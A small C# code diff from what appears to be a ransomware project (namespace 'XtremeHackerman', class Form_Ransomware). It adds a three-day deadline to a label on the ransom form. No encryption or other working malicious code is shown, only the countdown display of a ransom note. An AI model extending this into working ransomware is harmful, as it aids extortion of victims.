@@ -15,6 +15,8 @@ namespace XtremeHackerman
         public Form_Ransomware()
         {
             InitializeComponent();
+            DateTime expiryDate = DateTime.Now.AddDays(3);
+            Label_date.Text = expiryDate.ToString();
         }
     }
 }
